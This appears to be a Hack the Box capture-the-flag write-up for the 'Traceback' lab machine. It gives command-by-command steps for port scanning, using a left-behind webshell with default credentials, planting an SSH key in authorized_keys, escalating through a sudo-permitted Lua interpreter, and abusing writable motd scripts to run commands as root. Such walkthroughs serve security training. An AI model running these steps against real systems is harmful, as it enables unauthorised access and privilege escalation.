+++
title = "Hack the Box: Traceback"
date = 2023-02-12
description = "Hack the Box: Traceback"
tags = [
    "Hack the Box",
    "Write-up"
]
+++

# Traceback

## Enumeration

### Nmap

```
# sudo nmap -sV -sC -O -Pn -nvv --top-ports 5000 traceback.htb
Discovered open port 1443/tcp on 10.10.10.181
Discovered open port 80/tcp on 10.10.10.181
Discovered open port 22/tcp on 10.10.10.181
Completed SYN Stealth Scan at 10:32, 847.73s elapsed (5000 total ports)

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbMNfxYPZGAdOf2OAbwXhXDi43/QOeh5OwK7Me/l15Bej9yfkZwuLhyslDCYIvi4fh/2ZxB0MecNYHM+Sf4xR/CqPgIjQ+NuyAPI/c9iXDDhzJ+HShRR5WIqsqBHwtsQFrcQXcfQFYlC+NFj5ro9wfl2+UvDO6srTUxl+GaaabePYm2u0mlmfwHqlaQaB8HOUb436IdavyTdvpW7LTz4qKASrCTPaawigDymMEQTRYXY4vSemIGMD1JbfpErh0mrFt0Hu12dmL6LrqNmUcbakxOXvZATisHU5TloxqH/p2iWJSwFi/g0YyR2JZnIB65fGTLjIhZsOohtSG7vrPk+cZ
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD2jCEklOC94CKIBj9Lguh3lmTWDFYq41QkI5AtFSx7x+8uOCGaFTqTwphwmfkwZTHL1pzOMoJTrGAN8T7LA2j0=
|   256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL4LOW9SgPQeTZubVmd+RsoO3fhSjRSWjps7UtHOc10p
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
1443/tcp open  ies-lm? syn-ack ttl 63
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL, SSLSessionReq: 
|     /bin/sh: 0: can't access tty; job control turned off
|   GenericLines: 
|     /bin/sh: 0: can't access tty; job control turned off
|     /bin/sh: 1: 
|     found
|     /bin/sh: 2: 
|     found
|   GetRequest: 
|     /bin/sh: 0: can't access tty; job control turned off
|     /bin/sh: 1: GET: not found
|     /bin/sh: 2: 
|     found
|   HTTPOptions, RTSPRequest: 
|     /bin/sh: 0: can't access tty; job control turned off
|     /bin/sh: 1: OPTIONS: not found
|     /bin/sh: 2: 
|     found
|   Help: 
|     /bin/sh: 0: can't access tty; job control turned off
|     /bin/sh: 1: HELP
|     found
|   Kerberos: 
|     /bin/sh: 0: can't access tty; job control turned off
|     /bin/sh: 1: qj
|     found
|   RPCCheck: 
|     /bin/sh: 0: can't access tty; job control turned off
|     /bin/sh: 1: Syntax error: word unexpected (expecting ")")
|   TLSSessionReq: 
|     /bin/sh: 0: can't access tty; job control turned off
|     /bin/sh: 1: 
|     random1random2random3random4
|     found
|   TerminalServerCookie: 
|     /bin/sh: 0: can't access tty; job control turned off
|     /bin/sh: 1: 
|_    Cookie:: not found
```

Let’s enumerate the website:

```
# gobuster dir -u http://traceback.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,js,txt,htm,html,jsp
```

## Foothold

we can find some pages and a weshell at `smevk.php`, the default `admin:admin` credentials work. After loggin-in you can:

- Upload php reverse shell script through Code Injector module. or
- Generate an ssh keys with `ssh-keygen` command and execute the following in the web shell:

```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/WizzC4vhWJz0s3IW7+qzJ8O6K4QiaN/VdHEzY8M8YRzVsJ4LH+DNKmb5y0u1a2C80kc5T32gKuabKQDNql+YkliNw3sMD8EvK4jw3aJeTMcxsW5MVUK/bifx0orcEp0oN6cEQ3EpgfjSN7SOFs8ELsMihvLaXT6yWkh08mbhRc4X0W2XJy75Ryx1ErrezrlFagyQkAlvOtuK+okMb3XEw8ZEIeub3gGKeoR0qYySBTPqB/YV91OZeScDpa41D0MY6YIsq+XeE/2LYerw1Nrz4L1clDiV87V7uzcwkpOPQkuHSYDx+qZ5xEyXg/3NdoOkewkeNpkR8KffWHDsBXAwYz9tR4l1RmXNzftRBdEDTEmxop97T0pMvlNLphAkvFZ38I2OkfN54GyNdqhU+T4ZbQkAWovvdb6QRvIcYX3h1OiQ28LcIEJK90A2qQ16iEJPPPU4+dimpRGjg51qs6J+TlrVtv68LNGFBWb16tl84yKdxcUf2A3YmQP4+ZGqciE= robin@kali" >> ~/.ssh/authorized_keys
```

When it’s done you can loggin using:

```
# ssh -i .ssh/id_rsa webadmin@traceback.htb
```

User flag is in the sysadmin /home.

```
# cat note.txt
# cat .bash_history
# sudo -l
# ps -aux
```

Let’s get sysadmin with the informations gathered from above commands:

```
# echo 'os.execute("/bin/sh")' > privesc.lua
# sudo -u sysadmin /home/sysadmin/luvit privesc.lua
# cat user.txt
```

To get the root flag do the following and disconnect/reconnect, the root flag should appear in the motd banner:

```
# echo "cat /root/root.txt" >> /etc/update-motd.d/00-header
```
